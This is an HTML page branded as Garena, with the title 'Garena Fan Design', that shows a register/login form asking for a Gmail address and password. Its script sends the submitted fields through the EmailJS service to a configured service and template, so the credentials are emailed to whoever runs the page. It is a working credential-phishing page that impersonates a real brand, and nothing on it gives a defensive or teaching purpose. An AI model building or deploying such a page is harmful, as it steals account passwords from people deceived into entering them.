<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Garena Fan Design</title>

<style>
* {
  box-sizing: border-box;
}

body {
  margin: 0;
  padding: 0;
  background: #f8fafc;
  font-family: Arial, sans-serif;
  min-height: 100vh;
  display: flex;
  justify-content: center;
  align-items: center;
}

.container {
  width: 90%;
  max-width: 420px;
  text-align: center;
}

.logo {
  color: #ff0015;
  font-size: 58px;
  font-weight: bold;
  margin-bottom: 45px;
}

h1 {
  color: #111827;
  font-size: 38px;
  margin-bottom: 35px;
}

.field {
  display: flex;
  align-items: center;
  width: 100%;
  height: 65px;
  border: 2px solid #d1d5db;
  border-radius: 10px;
  background: white;
  margin-bottom: 18px;
  padding: 15px;
}

.icon {
  font-size: 25px;
  margin-right: 20px;
}

input {
  width: 100%;
  min-width: 0;
  border: none;
  outline: none;
  font-size: 19px;
  background: transparent;
  color: #111827;
}

input::placeholder {
  color: #929bb0;
}

.field:focus-within {
  border-color: #ff1025;
}

button {
  width: 100%;
  height: 65px;
  background: #ff1025;
  color: white;
  border: none;
  border-radius: 10px;
  font-size: 25px;
  font-weight: bold;
  margin-top: 12px;
  cursor: pointer;
}

button:active {
  background: #d90018;
}

.message {
  color: #b91c1c;
  font-size: 14px;
  margin-top: 15px;
}

.note {
  color: #777;
  font-size: 12px;
  margin-top: 20px;
}
</style>
</head>

<body>

<div class="container">

  <div class="logo">
    Garena
  </div>

  <h1>Register</h1>
  <form id="contact-form">
  <div class="field">
    <span class="icon">✉</span>
    <input
      type="email"
      name="user_email"
      placeholder="Gmail"
      autocomplete="off"
      aria-label="Gmail"
    >
  </div>

  <div class="field">
    <span class="icon">🔒</span>
    <input
      type="password"
      name="message"
      placeholder="Password"
      autocomplete="off"
      aria-label="Password"
    >
  </div>

  <button
    type="submit"
  >
    Login
  </button>
  </form>
  <p
    class="message"
    id="message"
    role="status"

  </p>

</div>
<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>

<script>
  emailjs.init({
    publicKey: "MKcTqPydpPWdHb6zG"
      });

  document.getElementById("contact-form")
    .addEventListener("submit", function(event) {
      event.preventDefault();

      emailjs.sendForm(
        "service_mwom3mq",
        "template_9pr363d",
        this
      ).then(function() {
        document.getElementById("message").textContent =
          "Message sent successfully!";
      }, function(error) {
        document.getElementById("message").textContent =
          "Message failed. Please try again.";
        console.error(error);
      });
    });
</script>
</body>
</html>
